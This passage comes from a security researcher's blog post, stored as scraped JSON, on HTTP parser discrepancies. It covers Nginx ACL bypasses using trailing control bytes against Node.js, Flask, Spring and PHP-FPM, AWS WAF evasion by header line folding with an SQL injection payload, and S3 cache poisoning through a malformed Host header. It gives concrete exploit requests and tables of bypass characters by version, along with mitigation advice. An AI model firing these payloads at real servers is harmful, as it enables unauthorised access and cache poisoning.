retrieve the backend of the corresponding response for the `/static/main.js` URL using the `1337.target.com` host header. Subsequently, it will generate a stored response specifically for that particular HTTP message.\\n\\n## S3 HTTP Desync Cache Poisoning Issue\\n\\nIn this section, I will demonstrate an HTTP Desync vulnerability that can result in Cache Poisoning, impacting principally AWS S3 buckets.\\n\\nIn the Amazon AWS S3 buckets, the Host header plays a crucial role in routing requests to the correct bucket and enabling proper access to the stored content. When interacting with an S3 bucket, the Host header helps direct requests to the appropriate endpoint within the AWS infrastructure.\\n\\nWhen a request is made to an S3 bucket, the AWS infrastructure inspects the Host header to determine the target bucket. So if a user sends an HTTP request to the domain `your.s3.amazonaws.com` but changes the host header to `my.s3.amazonaws.com`, internally, AWS will \\\"ignore\\\" the domain name, fetching the bucket specified in the host header only. This is a common practice on Cloud services.\\n\\n### The Vulnerability\\n\\nThe interpretation of host headers for S3 buckets involves two key aspects:\\n\\n1. When multiple host headers are included in the request, only the first one will be taken, and any additional headers will be ignored.\\n    \\n2. The following bytes are ignored if present in the header name: `\\\\x1f`, `\\\\x1d`, `\\\\x0c`, `\\\\x1e`, `\\\\x1c`, `\\\\x0b`;\\n    \\n\\nThe vulnerability arises from an inconsistency in the host header interpretation. If the cache server mistakenly includes the ignored bytes as part of the header name, treating it as an invalid host header, while S3 interprets it as a valid host header, it becomes possible to cache arbitrary bucket responses on vulnerable websites.\\n\\nThis behavior allows caching arbitrary S3 bucket content in vulnerable websites.\\n\\nConsider the following exploitation request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686958907855/ffd360e3-5eb8-4ffd-939d-b46614f9f430.png align=\\\"center\\\")\\n\\n```http\\nGET / HTTP/1.1\\n[\\\\x1d]Host: evilbucket.com\\nHost: example.bucket.com\\nConnection: close\\n```\\n\\n* First, the cache server examines the header `\\\\x1dHost: evilbucket.com` and treats it like any other unkeyed header;\\n    \\n* Subsequently, the cache server will correctly interpret the `example.bucket.com` header as a valid host header, resulting in the final cache response being associated with this host value.\\n    \\n* Upon reaching the S3 bucket, the header `\\\\x1dHost: evilbucket.com` will be mistakenly interpreted as a valid host header, while the intended `Host: example.bucket.com` header will be ignored. This misinterpretation by AWS will lead to the fetching of the malicious header's associated bucket.\\n    \\n\\nThe final result is a complete cache poisoning of the page with arbitrary content.\\n\\nThe proof of concept video demonstrates the exploitation of this vulnerability in an outdated Varnish cache server. It is important to note that newer versions of Varnish are not susceptible to this vulnerability:\\n\\n%[https://www.youtube.com/watch?v=dnf6Zi5eNW8] \\n\\nIn addition to Varnish, other cache servers such as Akamai were also vulnerable to this issue. However, it's important to note that this vulnerability has been addressed and cannot be reproduced on any AWS service today.\\n\\n# Conclusion\\n\\nIn conclusion, this research delved into the realm of security vulnerabilities in web applications, specifically focusing on HTTP parsers and the implications they can have on overall security. By exploring inconsistencies in HTTP parsers across various technologies, such as load balancers, reverse proxies, web servers, and caching servers, I unveiled potential avenues for exploitation.\\n\\nI demonstrated how certain behaviors, like path normalization and the acceptance of special characters, can lead to bypassing security rules and even opening the door to Server-Side Request Forgery (SSRF) and Cache Poisoning vulnerabilities.\\n\\nMoreover, I highlighted the significance of utilizing reverse proxies that effectively validate and sanitize HTTP requests. Implementing a robust reverse proxy can significantly bolster the security posture of a web application by intercepting and filtering malicious requests before they reach the backend servers.\",\"content\":\"\u003cp\u003eThe HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\u003c/p\u003e\\n\u003cp\u003eIn this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers. By investigating these disparities, I aim to shed light on potential new vulnerabilities that involve HTTP Desync attacks.\u003c/p\u003e\\n\u003cp\u003eIt was my first security research, I started on this journey in December 2021 and concluded in April 2022. I tried to be creative in finding new attack vectors due to incorrect HTTP parsing. In this post, I will share the final results of this study.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules\\\"\u003ePathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules\u003c/h1\u003e\\n\u003cp\u003eThis section of the research focuses on the exploitable vulnerabilities arising from pathname manipulation in web servers, principally about the use of \u003ccode\u003etrim()\u003c/code\u003e or \u003ccode\u003estrip()\u003c/code\u003e functions. By exploiting these techniques, attackers can circumvent security rules specific to certain paths in reverse proxies and load balancers, posing a significant threat to web application security.\u003c/p\u003e\\n\u003cp\u003eIn this section, we delve into the intricacies of how web servers process and manipulate pathnames, investigating the impact of the removal of certain characters, which can lead to unintended behaviors.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-nginx-acl-rules\\\"\u003eNginx ACL Rules\u003c/h2\u003e\\n\u003cp\u003eNginx is a powerful web server and reverse proxy which allows developers to apply security rules on HTTP requests. This section explores security threads of the capabilities of Nginx in rewriting or blocking HTTP messages, with a primary focus on rules triggered by specific strings or regular expressions found within the HTTP pathname section.\u003c/p\u003e\\n\u003cp\u003eIn Nginx, the \\\"location\\\" rule enables developers to define specific directives and behaviors based on the requested URL. This rule acts as a key component in routing and processing incoming HTTP requests, allowing control over how different URLs are handled.\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eThe above Nginx rule aims to deny every access to the \u003ccode\u003e/admin\u003c/code\u003e endpoint, so if a user tries to access this endpoint, Nginx will return \u003ccode\u003e403\u003c/code\u003e and will not pass the HTTP message to the web server.\u003c/p\u003e\\n\u003cp\u003eTo prevent security issues on URI-based rules, Nginx performs path normalization before checking them. Path normalization in Nginx refers to the process of transforming and standardizing requested URLs to a consistent and canonical format before handling them. It involves removing redundant or unnecessary elements from the URL path, such as extra slashes, dot segments, processing path traversal, and URL-encoded characters, to ensure uniformity and proper routing within the web server.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-trim-inconsistencies\\\"\u003eTrim Inconsistencies\u003c/h2\u003e\\n\u003cp\u003eBefore we proceed, we need to understand what the \u003ccode\u003etrim()\u003c/code\u003e function does in different languages.\u003c/p\u003e\\n\u003cp\u003eDifferent languages remove different characters when the correspondent function for \u003ccode\u003etrim()\u003c/code\u003e is called. Each server will normalize the pathname based on its \u003ccode\u003etrim()\u003c/code\u003e, removing different characters. But Nginx which is written in C, does not cover all characters for all languages.\u003c/p\u003e\\n\u003cp\u003eE.g.: Python removes the character \u003ccode\u003e\\\\x85\u003c/code\u003e with \u003ccode\u003estrip()\u003c/code\u003e, and JavaScript does not with \u003ccode\u003etrim()\u003c/code\u003e.\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686750781066/bf6a391a-2bf5-4605-9e5e-8cc0f059a995.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686750895455/784cf8a4-b070-4bb6-abd0-12ae887d568c.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIf an HTTP message is parsed using the \u003ccode\u003etrim()\u003c/code\u003e function in different languages, an HTTP Desync attack can occur.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-bypassing-nginx-acl-rules-with-nodejs\\\"\u003eBypassing Nginx ACL Rules With Node.js\u003c/h2\u003e\\n\u003cp\u003eLet's consider the following Nginx ACL rule and Node.js API source code using Express:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-javascript\\\"\u003eapp.get(\u003cspan class=\\\"hljs-string\\\"\u003e'/admin'\u003c/span\u003e, \u003cspan class=\\\"hljs-function\\\"\u003e(\u003cspan class=\\\"hljs-params\\\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\\n    \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e res.send(\u003cspan class=\\\"hljs-string\\\"\u003e'ADMIN'\u003c/span\u003e);\\n});\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eFollowing the \u003ccode\u003etrim()\u003c/code\u003e logic, Node.js \\\"ignores\\\" the characters \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\xa0\u003c/code\u003e, and \u003ccode\u003e\\\\x0c\u003c/code\u003e from the pathname, but Nginx considers them as part of the URL:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686751453300/0531fc1a-9599-4a00-aa94-21cca2db557c.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003cp\u003eFirst, Nginx receives the HTTP request and performs path normalization on the pathname;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eAs Nginx includes the character \u003ccode\u003e\\\\xa0\u003c/code\u003e as part of the pathname, the ACL rule for the \u003ccode\u003e/admin\u003c/code\u003e URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eWhen the URI \u003ccode\u003e/admin\\\\x0a\u003c/code\u003e is received by the Node.js server, the character \u003ccode\u003e\\\\xa0\u003c/code\u003e will be removed, allowing successful retrieval of the \u003ccode\u003e/admin\u003c/code\u003e endpoint.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003cp\u003eBelow is a graphical demonstration of what happens with the HTTP request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686752151660/84ec1c49-2df9-4a44-ab01-1d798ef0564f.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eTo gain a clearer understanding of how this vulnerability can be exploited, I recommend watching the accompanying proof of concept video below:\u003c/p\u003e\\n\u003cdiv class=\\\"embed-wrapper\\\"\u003e\u003cdiv class=\\\"embed-loading\\\"\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003c/div\u003e\u003ca class=\\\"embed-card\\\" href=\\\"https://www.youtube.com/watch?v=sgs3s5oTfz8\\\"\u003ehttps://www.youtube.com/watch?v=sgs3s5oTfz8\u003c/a\u003e\u003c/div\u003e\\n\u003cp\u003e \u003c/p\u003e\\n\u003cp\u003eBelow is a table correlating Nginx versions with characters that can potentially lead to bypassing URI ACL rules when using Node.js as the backend:\u003c/p\u003e\\n\u003cdiv class=\\\"hn-table\\\"\u003e\\n\u003ctable\u003e\\n\u003cthead\u003e\\n\u003ctr\u003e\\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eNode.js Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/thead\u003e\\n\u003ctbody\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/tbody\u003e\\n\u003c/table\u003e\\n\u003c/div\u003e\u003ch2 id=\\\"heading-bypassing-nginx-acl-rules-with-flask\\\"\u003eBypassing Nginx ACL Rules With Flask\u003c/h2\u003e\\n\u003cp\u003eFlask removes the characters \u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e, and \u003ccode\u003e\\\\x09\u003c/code\u003e from the URL path, but NGINX doesn't.\u003c/p\u003e\\n\u003cp\u003eTake the following nginx configuration/API source code as a reference:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-python\\\"\u003e\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/admin', methods = ['GET'])\u003c/span\u003e\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003edef\u003c/span\u003e \u003cspan class=\\\"hljs-title\\\"\u003eadmin\u003c/span\u003e():\u003c/span\u003e\\n    data = {\u003cspan class=\\\"hljs-string\\\"\u003e\\\"url\\\"\u003c/span\u003e:request.url, \u003cspan class=\\\"hljs-string\\\"\u003e\\\"admin\\\"\u003c/span\u003e:\u003cspan class=\\\"hljs-string\\\"\u003e\\\"True\\\"\u003c/span\u003e}\\n\\n    \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e Response(str(data), mimetype=\u003cspan class=\\\"hljs-string\\\"\u003e\\\"application/json\\\"\u003c/span\u003e)\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eAs you can see below, it's possible to circumvent the ACL protection by adding the character \u003ccode\u003e\\\\x85\u003c/code\u003e at the end of the pathname:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686753386536/4032be9b-c7f3-48ae-8074-5d9ad1f9e7a5.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cdiv class=\\\"hn-table\\\"\u003e\\n\u003ctable\u003e\\n\u003cthead\u003e\\n\u003ctr\u003e\\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eFlask Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/thead\u003e\\n\u003ctbody\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/tbody\u003e\\n\u003c/table\u003e\\n\u003c/div\u003e\u003ch2 id=\\\"heading-bypassing-nginx-acl-rules-with-spring-boot\\\"\u003eBypassing Nginx ACL Rules With Spring Boot\u003c/h2\u003e\\n\u003cp\u003eSpring removes the characters \u003ccode\u003e\\\\x09\u003c/code\u003e and \u003ccode\u003e\\\\x3B\u003c/code\u003e from the URL path, but Nginx doesn't.\u003c/p\u003e\\n\u003cp\u003eTake the following Nginx configuration/API source code as a reference:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-java\\\"\u003e\u003cspan class=\\\"hljs-meta\\\"\u003e@GetMapping(\\\"/admin\\\")\u003c/span\u003e\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003epublic\u003c/span\u003e String \u003cspan class=\\\"hljs-title\\\"\u003eadmin\u003c/span\u003e\u003cspan class=\\\"hljs-params\\\"\u003e()\u003c/span\u003e \u003c/span\u003e{\\n    \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e\\\"Greetings from Spring Boot!\\\"\u003c/span\u003e;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eBelow, you will find a demonstration of how ACL protection can be circumvented by adding the character \u003ccode\u003e\\\\x09\u003c/code\u003e or \u003ccode\u003e\\\\t\u003c/code\u003e at the end of the pathname:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686753921718/b3f91ea3-558f-4889-860c-15cdc02cb7f6.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cdiv class=\\\"hn-table\\\"\u003e\\n\u003ctable\u003e\\n\u003cthead\u003e\\n\u003ctr\u003e\\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eSpring Boot Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/thead\u003e\\n\u003ctbody\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/tbody\u003e\\n\u003c/table\u003e\\n\u003c/div\u003e\u003ch2 id=\\\"heading-bypassing-nginx-acl-rules-with-php-fpm-integration\\\"\u003eBypassing Nginx ACL Rules With PHP-FPM Integration\u003c/h2\u003e\\n\u003cp\u003ePHP-FPM (FastCGI Process Manager) is a robust and high-performance PHP FastCGI implementation that works seamlessly with Nginx. It serves as a standalone server for handling PHP requests, improving the speed and efficiency of PHP execution. Nginx acts as a reverse proxy, receiving incoming HTTP requests and passing them to PHP-FPM for processing.\u003c/p\u003e\\n\u003cp\u003eLet's consider the following Nginx FPM configuration:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin.php {\\n    deny all;\\n}\\n\\nlocation ~ \\\\.php$ {\\n    include snippets/fastcgi-php.conf;\\n    fastcgi_pass unix:/run/php/php8.1-fpm.sock;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eWhen two \u003ccode\u003e.php\u003c/code\u003e files are in the same pathname of the HTTP request, PHP will match the first one, ignoring everything after the slash. Since the Nginx is configured to block requests to the specific endpoint \u003ccode\u003e/admin.php\u003c/code\u003e, it's possible to access the admin.php file by doing the following request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758750001/66ac562a-7da9-4397-a76a-1d641474e000.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eBelow is a graphical example of how the applications interpret the HTTP request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758967146/03073365-9dbf-4cf5-8762-1d705c9a038c.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eThis technique only works if the second PHP file, in this case, \u003ccode\u003eindex.php\u003c/code\u003e, exists in the server structure. Take the following server code/structure as a reference:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758832956/d0708099-48e0-46d0-b646-8bb92c51454a.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eThese behaviors were reported to the Nginx security team in 2022, and they responded by saying that they don't have responsibility for it.\u003c/p\u003e\\n\u003cp\u003eSince the research concluded in April 2022, newer versions of Nginx were not specifically tested. However, it is highly likely that the findings and vulnerabilities identified in the research are reproducible in the latest version of Nginx as well.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-how-to-prevent\\\"\u003eHow to prevent\u003c/h2\u003e\\n\u003cp\u003eTo prevent these issues, you must use the \u003ccode\u003e~\u003c/code\u003e expression Instead of the \u003ccode\u003e=\u003c/code\u003e expression on Nginx ACL rules, for example:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation ~* ^/admin {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eThe \u003ccode\u003e~\u003c/code\u003e expression matches the string \u003ccode\u003e/admin\u003c/code\u003e in any part of the pathname, in other words, if a user sent a request to \u003ccode\u003e/admin1337\u003c/code\u003e, the request will also be blocked.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-bypassing-aws-waf-acl\\\"\u003eBypassing AWS WAF ACL\u003c/h1\u003e\\n\u003ch2 id=\\\"heading-how-aws-waf-acls-work\\\"\u003eHow AWS WAF ACLs Work\u003c/h2\u003e\\n\u003cp\u003eAWS ACL (Access Control List) rules are a component of load balancers, providing control over incoming and outgoing network traffic. These rules define access permissions based on specified conditions, allowing or denying requests to and from the load balancer.\u003c/p\u003e\\n\u003cp\u003eYou can configure the AWS Web Application Firewall (WAF) ACL to examine and validate HTTP headers. AWS WAF ACL rules allow you to define conditions based on specific header attributes or values, enabling you to control and filter incoming requests.\u003c/p\u003e\\n\u003cp\u003eHeader ACL example:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686762641000/8f9c4e41-c17a-48d6-b2f5-72d76217e337.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIn the above example, if a request contains a SQL Injection payload in the \u003ccode\u003eX-Query\u003c/code\u003e header, AWS WAF recognizes the SQL Injection attempt and responds with a \u003ccode\u003e403 Forbidden\u003c/code\u003e HTTP status code. This prevents the request from being forwarded to the backend, effectively blocking any potential exploitation of the application's database through SQL Injection attacks.\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686763561032/d592bd74-2618-461d-9768-314549b691cf.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eAs you can see, the above request carried the payload \u003ccode\u003e' or '1'='1' --\u003c/code\u003e at the \u003ccode\u003eX-Query\u003c/code\u003e header, and then was blocked by the AWS WAF.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-bypassing-aws-waf-acl-with-line-folding\\\"\u003eBypassing AWS WAF ACL With Line Folding\u003c/h2\u003e\\n\u003cp\u003eWeb servers like Node.js, Flask and many others sometimes encounter a phenomenon known as \\\"line folding.\\\" Line folding refers to the practice of splitting long header values using the characters \\\\x09 (tab) and \\\\x20 (space) into multiple lines for readability. However, this behavior can lead to compatibility issues and potential security vulnerabilities.\u003c/p\u003e\\n\u003cp\u003eFor example, the header \u003ccode\u003e1337: Value\\\\r\\\\n\\\\t1337\u003c/code\u003e in the following request will be interpreted as \u003ccode\u003e1337: Value\\\\t1337\u003c/code\u003e in the Node.js server:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003e1337\u003c/span\u003e: Value\\n    1337\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eKnowing it, I discovered that it's possible to bypass the AWS WAF by using line folding behavior.\u003c/p\u003e\\n\u003cp\u003eUsing the same AWS WAF that protects the \u003ccode\u003eX-Query\u003c/code\u003e from SQL Injection payloads, the following HTTP request was used to confirm that the Node.js server received the payload \u003ccode\u003e' or '1'='1' --\u003c/code\u003e in the \u003ccode\u003eX-Query\u003c/code\u003e header.\u003c/p\u003e\\n\u003cp\u003eBelow is a graphical example of how the applications interpret the HTTP request header with line folding:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686765599948/440f51b0-18bb-451c-92da-3428000cd7f0.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eFor the exploitation scenario, let's take the following Node.js source code as a reference. It will return the requested headers as a Json:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-javascript\\\"\u003eapp.get(\u003cspan class=\\\"hljs-string\\\"\u003e'/*'\u003c/span\u003e, \u003cspan class=\\\"hljs-function\\\"\u003e(\u003cspan class=\\\"hljs-params\\\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\\n    res.send(req.headers);\\n});\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eBelow is an example of an exploitation request:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-attribute\\\"\u003eGET / HTTP/1.1\\\\r\\\\n\\nHost\u003c/span\u003e: target.com\\\\r\\\\n\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eX-Query\u003c/span\u003e: Value\\\\r\\\\n\\n\\\\t' or '1'='1' -- \\\\r\\\\n\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\\\r\\\\n\\n\\\\r\\\\n\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686765362775/dbd69c56-503e-45bb-ada6-358d3d987ede.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIn the provided screenshot, it is evident that the Node.js application interpreted the characters 